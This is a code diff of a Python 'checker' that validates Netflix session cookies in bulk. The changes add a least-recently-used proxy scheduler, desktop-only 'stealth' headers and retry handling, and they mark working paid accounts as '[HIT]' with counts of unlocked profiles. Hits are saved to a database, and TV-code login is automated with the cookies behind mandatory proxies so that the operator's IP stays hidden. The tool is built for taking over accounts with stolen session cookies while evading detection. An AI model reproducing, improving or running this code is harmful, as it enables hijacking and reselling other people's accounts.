@@ -13,11 +13,40 @@ from typing import Any, Dict, List, Optional
 from urllib.parse import unquote, urlparse
 import requests
 import urllib3
+import traceback
+
 
 # Import the new modular payload parser
 import payload_parser
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+# --- GLOBAL PROXY SCHEDULER TRACKER ---
+PROXY_USAGE_LOCK = threading.Lock()
+PROXY_LAST_USED = {}
+
+def get_smart_proxy(proxies_list):
+    """Mathematically selects the proxy that has been resting the longest (LRU)"""
+    if not proxies_list: 
+        return None
+        
+    with PROXY_USAGE_LOCK:
+        best_proxy = None
+        oldest_time = float('inf')
+        
+        for p in proxies_list:
+            p_str = p['http']
+            used_time = PROXY_LAST_USED.get(p_str, 0)
+            if used_time < oldest_time:
+                oldest_time = used_time
+                best_proxy = p
+                
+        # Mark this proxy as 'just used' right now
+        if best_proxy:
+            PROXY_LAST_USED[best_proxy['http']] = time.time()
+            
+        return best_proxy
 
 # ==========================================
 # --- EXACT PROXY SUPPORT FROM NFX_LIVE_FAST ---
@@ -142,19 +171,17 @@ def get_public_ip(proxies):
 # --- STEALTH HEADER GENERATOR ---
 # ==========================================
 def get_random_headers():
+    # STRICTLY DESKTOP PROFILES. Mobile UAs will trigger a redirect on /browse and break the falcorCache extraction.
     browser_profiles = [
-        ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'),
+        ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
         ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
         ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
         ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
-        ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
-        ('Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
         ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8')
     ]
     languages = [
         "en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
-        "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
-        "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"
+        "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
     ]
     
     ua, accept = random.choice(browser_profiles)
@@ -260,14 +287,19 @@ def normalize_language(native_lang: str, fallback_lang: str) -> str:
             return standard_name
             
     return native_lang
-    
+
+
+
+
+
+
 # ==========================================
-# --- EXTRACTION LOGIC (UPDATED WITH SEPARATE PARSER) ---
+# --- EXTRACTION LOGIC ---
 # ==========================================
-def perform_extraction(html: str, original_id: str, processed_guids: set, guid_lock: threading.Lock):
+def perform_extraction(acc_html: str, browse_html: str, original_id: str, processed_guids: set, guid_lock: threading.Lock):
     
-    # 1. Fetch raw data from our new separated parser
-    data = payload_parser.parse_html(html)
+    # 1. Fetch raw data from our enriched modular parser
+    data = payload_parser.parse_html(acc_html, browse_html)
     
     if data.get("error"):
         return "ERROR", "Unknown", "Unknown", False, False, {}
@@ -304,7 +336,7 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
     else:
         member_since = fmt_date_MMM_D_YYYY(str(member_since))
 
-    status_label = "[HIT]" if is_subscribed else ("[FREE]" if not is_on_hold else "[ON HOLD]")
+    status_label = "[HIT]" if is_subscribed else ("[FREE]" if is_on_hold is False else "[ON HOLD]")
     
     out = []
     out.append(f"\n--- {status_label} ACCOUNT DETAILS ---")
@@ -325,7 +357,18 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
     out.append(bullet("Hold Status", yes_no(is_on_hold)))
     out.append(bullet("Membership Status", data.get("membership_status")))
     
-    out.append(bullet("Connected Profiles", data.get("profiles_count")))
+    # Format the Unlocked Profiles safely
+    falcor_found = data.get("falcor_found", False)
+    unlocked_profiles = data.get("unlocked_profiles")
+    
+    if falcor_found:
+        if unlocked_profiles is not None and unlocked_profiles > 0:
+            out.append(f"• Unlocked Profiles: {unlocked_profiles}")
+        else:
+            out.append("• Unlocked Profiles: Null")
+    else:
+        out.append("• Unlocked Profiles: Error (Data Unavailable)")
+        
     out.append("---------------------------------\n")
     
     db_data = {
@@ -334,128 +377,170 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
         "plan": canonical_plan,
         "quality": quality,
         "language": display_lang,
+        "unlocked_profiles": unlocked_profiles,
         "status": status_label.replace("[", "").replace("]", ""),
         "cli_text": "\n".join(out)
     }
     
     return "\n".join(out), canonical_plan, quality, is_subscribed, is_on_hold, db_data
-    
+
+
 # ==========================================
 # --- EXACT THREAD WORKER WITH DETAILED LOGS ---
 # ==========================================
 def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None, delete_callback=None, detailed_logs=None):
     max_retries = 3 
     retryable_status_codes = {403, 429, 500, 502, 503, 504}
-    
     last_proxy = None 
 
     while True:
-        try: netflix_id = q.get_nowait()
-        except Empty: break
+        try: 
+            netflix_id = q.get_nowait()
+        except Empty: 
+            break
             
         clean_id = netflix_id.replace("NetflixId=", "").strip()
         if not clean_id:
             q.task_done()
             continue
 
-        time.sleep(random.uniform(0.4, 1.2))
+        try:
+            time.sleep(random.uniform(0.4, 1.2))
 
-        success = False
-        status_for_log = "ERROR"
-        proxy_host_for_log = "DIRECT IP"
-        last_error_detail = "" 
+            success = False
+            status_for_log = "ERROR"
+            proxy_host_for_log = "DIRECT IP"
+            last_error_detail = "" 
 
-        for attempt in range(max_retries):
-            proxy = None
-            if proxies:
-                if len(proxies) > 1:
-                    valid_proxies = [p for p in proxies if p != last_proxy]
-                    proxy = random.choice(valid_proxies) if valid_proxies else proxies[0]
+            for attempt in range(max_retries):
+                proxy = get_smart_proxy(proxies)
+
+                if proxy:
+                    try:
+                        p_url = urlparse(proxy['http'])
+                        if p_url.username:
+                            safe_user = f"{p_url.username[:4]}***"
+                            proxy_host_for_log = f"{safe_user}@{p_url.hostname}:{p_url.port}"
+                        else:
+                            proxy_host_for_log = f"{p_url.hostname}:{p_url.port}" 
+                    except:
+                        proxy_host_for_log = "PROXY"
                 else:
-                    proxy = proxies[0]
-                last_proxy = proxy
-                
-                try:
-                    p_url = urlparse(proxy['http'])
-                    if p_url.username:
-                        safe_user = f"{p_url.username[:4]}***"
-                        proxy_host_for_log = f"{safe_user}@{p_url.hostname}:{p_url.port}"
-                    else:
-                        proxy_host_for_log = f"{p_url.hostname}:{p_url.port}" 
-                except:
-                    proxy_host_for_log = "PROXY"
+                    proxy_host_for_log = "DIRECT IP"
 
-            try:
-                session = requests.Session()
-                session.headers.update(get_random_headers())
-                session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
-                
-                response = session.get('https://www.netflix.com/YourAccount', allow_redirects=True, proxies=proxy, timeout=15)
-                
-                if response.status_code in retryable_status_codes:
-                    status_for_log = "RETRY"
-                    last_error_detail = f"HTTP {response.status_code}"
+                try:
+                    session = requests.Session()
+                    session.headers.update(get_random_headers())
+                    session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
+                    
+                    response = session.get('https://www.netflix.com/YourAccount', allow_redirects=True, proxies=proxy, timeout=15)
+                    
+                    if response.status_code in retryable_status_codes:
+                        status_for_log = "RETRY"
+                        last_error_detail = f"HTTP {response.status_code}"
+                        continue 
+
+                    last_error_detail = ""
+
+                    if "login" in response.url.lower():
+                        status_for_log = "DEAD"
+                        with print_lock: stats["dead"] += 1
+                        if delete_callback: delete_callback(clean_id)
+                            
+                    elif 'netflix.reactContext' in response.text:
+                        browse_html = None
+                        
+                        if 'netflix.falcorCache' not in response.text:
+                            try:
+                                browse_response = session.get('https://www.netflix.com/browse', allow_redirects=True, proxies=proxy, timeout=15)
+                                browse_html = browse_response.text
+                            except requests.RequestException:
+                                pass 
+
+                        result_text, plan_name, quality, is_subscribed, is_on_hold, db_data = perform_extraction(
+                            response.text, browse_html, clean_id, processed_guids, guid_lock
+                        )
+                        
+                        # --- DEADLOCK FIX: Define flags before locking ---
+                        trigger_db = False
+                        trigger_del = False
+                        
+                        with print_lock:
+                            if result_text == "DUPLICATE":
+                                status_for_log = "DUPL"
+                                stats["duplicates"] += 1
+                                trigger_del = True
+                            elif result_text == "ERROR":
+                                status_for_log = "ERROR"
+                                stats["errors"] += 1
+                            else:
+                                if is_on_hold is True: 
+                                    status_for_log = "HOLD"
+                                    stats["holds"] += 1
+                                    trigger_del = True
+                                    
+                                elif is_subscribed:
+                                    # --- STRICT 0 PROFILE REJECTION ---
+                                    if db_data.get("unlocked_profiles") == 0:
+                                        status_for_log = "FULL"  # Marks as Full/Dead
+                                        stats["dead"] += 1
+                                        trigger_del = True  # Erases from DB on rescan, drops on upload
+                                    else:
+                                        status_for_log = "HIT"
+                                        stats["hits"] += 1
+                                        stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
+                                        stats["plans"][plan_name] = stats["plans"].get(plan_name, 0) + 1
+                                        trigger_db = True
+                                else:
+                                    status_for_log = "FREE"
+                                    stats["free"] += 1
+                                    trigger_del = True
+                                    
+                        # --- SAFE EXECUTION: Callbacks run OUTSIDE the lock ---
+                        if trigger_del and delete_callback: 
+                            delete_callback(clean_id)
+                        if trigger_db and db_callback: 
+                            db_callback(db_data)
+
+                    else:
+                        status_for_log = "UNKNOWN"
+                        with print_lock: stats["unknown"] += 1
+                    
+                    success = True
+                    break 
+
+                except (requests.exceptions.ProxyError, requests.RequestException) as e:
+                    status_for_log = "ERROR"
+                    last_error_detail = type(e).__name__ 
                     continue 
 
-                last_error_detail = ""
+            if not success:
+                status_for_log = "FAILED"
+                with print_lock:
+                    stats["errors"] += 1
 
-                if "login" in response.url.lower():
-                    status_for_log = "DEAD"
-                    with print_lock: stats["dead"] += 1
-                    if delete_callback: delete_callback(clean_id)
-                        
-                elif 'netflix.reactContext' in response.text:
-                    result_text, plan_name, quality, is_subscribed, is_on_hold, db_data = perform_extraction(
-                        response.text, clean_id, processed_guids, guid_lock
-                    )
-                    
-                    with print_lock:
-                        if result_text == "DUPLICATE":
-                            status_for_log = "DUPL"
-                            stats["duplicates"] += 1
-                        elif result_text == "ERROR":
-                            status_for_log = "ERROR"
-                            stats["errors"] += 1
-                        else:
-                            if is_on_hold: 
-                                status_for_log = "HOLD"
-                                stats["holds"] += 1
-                                if delete_callback: delete_callback(clean_id)
-                                
-                            elif is_subscribed:
-                                status_for_log = "HIT"
-                                stats["hits"] += 1
-                                stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
-                                stats["plans"][plan_name] = stats["plans"].get(plan_name, 0) + 1
-                                if db_callback: db_callback(db_data)
-                            else:
-                                status_for_log = "FREE"
-                                stats["free"] += 1
-                                if delete_callback: delete_callback(clean_id)
-                else:
-                    status_for_log = "UNKNOWN"
-                    with print_lock: stats["unknown"] += 1
-                
-                success = True
-                break 
+            if detailed_logs is not None:
+                err_str = f" | Error: {last_error_detail}" if last_error_detail else ""
+                with print_lock:
+                    detailed_logs.append(f"[{status_for_log.ljust(6)}] ID: {clean_id[:25]:<25}... | Proxy: {proxy_host_for_log}{err_str}")
 
-            except (requests.exceptions.ProxyError, requests.RequestException) as e:
-                status_for_log = "ERROR"
-                last_error_detail = type(e).__name__ 
-                continue 
-
-        if not success:
-            status_for_log = "FAILED"
+        except Exception as e:
+            status_for_log = "CRASH"
             with print_lock:
                 stats["errors"] += 1
+                print(f"\n[!] FATAL SYSTEM CRASH ON ID {clean_id[:15]}:")
+                traceback.print_exc()
+                
+            if detailed_logs is not None:
+                with print_lock:
+                    detailed_logs.append(f"[{status_for_log.ljust(6)}] ID: {clean_id[:25]:<25}... | INTERNAL CODE ERROR")
 
-        if detailed_logs is not None:
-            err_str = f" | Error: {last_error_detail}" if last_error_detail else ""
-            with print_lock:
-                detailed_logs.append(f"[{status_for_log.ljust(6)}] ID: {clean_id[:25]:<25}... | Proxy: {proxy_host_for_log}{err_str}")
+        finally:
+            q.task_done()
 
-        q.task_done()
-        
+
+
+
 def find_auth_in_react_context(html):
     patterns = [
         r'netflix\.reactContext\s*=\s*({.+?})\s*;?\s*</script>',
@@ -509,8 +594,8 @@ def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tu
         print("\n[!] FATAL: No proxies found. TV Login aborted to protect server IP.")
         return False, "System Error: No proxies available! Proxy usage is strictly enforced.", netflix_id
         
-    # 4. Select the proxy for this session
-    proxy = random.choice(active_proxies)
+    # 4. Mathematically select the proxy that has rested the longest
+    proxy = get_smart_proxy(active_proxies)
     proxy_str = proxy['http']
 
     # --- SESSION INITIALIZATION ---
